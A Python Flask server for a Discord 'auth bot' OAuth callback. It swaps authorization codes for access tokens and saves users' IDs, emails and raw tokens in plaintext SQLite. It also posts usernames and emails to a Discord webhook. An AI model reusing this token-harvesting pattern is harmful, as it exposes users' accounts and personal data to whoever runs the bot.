from flask import Flask, request
import aiohttp
import asyncio
import os
import sqlite3
import datetime
from dotenv import load_dotenv

load_dotenv()

# Initialize database with correct structure
def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id TEXT PRIMARY KEY, username TEXT, email TEXT, 
                  avatar TEXT, token TEXT, guild_id TEXT, 
                  auth_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

init_db()

app = Flask(__name__)

async def send_to_webhook(user_data):
    webhook_url = os.getenv('WEBHOOK_URL')
    print(f"Sending webhook for user: {user_data.get('username')}")
    
    embed = {
        "title": "🔐 New Authorization",
        "color": 0x2b2d31,
        "fields": [
            {
                "name": "👤 User",
                "value": f"{user_data.get('username')} (`{user_data.get('id')}`)",
                "inline": True
            },
            {
                "name": "📧 Email",
                "value": user_data.get('email', 'Not provided'),
                "inline": True
            }
        ],
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "footer": {
            "text": "🎡 @2vsq for auth bots"
        }
    }
    
    async with aiohttp.ClientSession() as session:
        await session.post(webhook_url, json={"embeds": [embed]})

async def process_oauth(code):
    guild_id = request.args.get('guild_id', '')
    async with aiohttp.ClientSession() as session:
        token_url = "https://discord.com/api/oauth2/token"
        data = {
            "client_id": os.getenv('CLIENT_ID'),
            "client_secret": os.getenv('CLIENT_SECRET'),
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": os.getenv('REDIRECT_URI')
        }
        
        async with session.post(token_url, data=data) as response:
            token_data = await response.json()
            
            if 'access_token' in token_data:
                headers = {'Authorization': f"Bearer {token_data['access_token']}"}
                async with session.get('https://discord.com/api/v9/users/@me', headers=headers) as me_response:
                    user_data = await me_response.json()
                    print(f"Saving auth for: {user_data.get('username')}")
                    
                    # Direct database operation
                    conn = sqlite3.connect('users.db')
                    c = conn.cursor()
                    c.execute('''CREATE TABLE IF NOT EXISTS users
                                (id TEXT PRIMARY KEY, username TEXT, email TEXT, 
                                 avatar TEXT, token TEXT, guild_id TEXT, 
                                 auth_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
                    
                    c.execute('INSERT OR REPLACE INTO users (id, username, email, avatar, token, guild_id) VALUES (?, ?, ?, ?, ?, ?)',
                            (user_data.get('id'),
                             user_data.get('username'),
                             user_data.get('email'),
                             user_data.get('avatar'),
                             token_data.get('access_token'),
                             guild_id))
                    conn.commit()
                    conn.close()
                    print(f"Auth saved successfully!")
                    
                    await send_to_webhook(user_data)
                    return True
    return False

@app.route('/callback')
def callback():
    code = request.args.get('code')
    guild_id = request.args.get('guild_id')
    
    if code:
        try:
            conn = sqlite3.connect('users.db', timeout=20)
            result = asyncio.run(process_oauth(code))
            print(f"New auth saved: {result}")
            return "✅ Authorization successful! You can close this window."
        except Exception as e:
            print(f"Database operation: {e}")
            return "Authorization processing..."
        finally:
            conn.close()
    return "Ready for authorization"

if __name__ == "__main__":
    print("OAuth Server Started - Ready to save authorizations!")
    app.run(host='0.0.0.0', port=8080)



